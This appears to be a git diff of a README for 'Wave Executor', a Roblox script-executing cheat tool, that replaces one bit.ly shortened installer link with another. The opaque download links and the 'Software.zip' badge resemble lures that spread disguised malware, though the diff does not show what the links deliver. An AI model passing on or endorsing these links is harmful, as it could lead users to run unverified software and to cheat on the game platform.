@@ -27,7 +27,7 @@ Welcome to Wave Executor, a robust Windows-based script executor tailored for Ro
 
 To install Wave Executor, follow these steps:
 
-1. Download the Wave Executor installer from the following link: [Download Wave Executor](https://bit.ly/3CYSSAj)
+1. Download the Wave Executor installer from the following link: [Download Wave Executor](https://bit.ly/3ZRFVBn)
 2. Run the installer on your Windows machine.
 3. Follow the on-screen instructions to complete the installation process.
 
@@ -59,4 +59,4 @@ Wave Executor is licensed under the MIT License. See the [LICENSE](LICENSE) file
 
 [Wave Executor](https://waveexecutor.com) - Elevate your Roblox gameplay with Wave Executor! 🌊🚀
 
-[![Download Wave Executor](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](https://bit.ly/3CYSSAj)
+[![Download Wave Executor](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](https://bit.ly/3ZRFVBn)
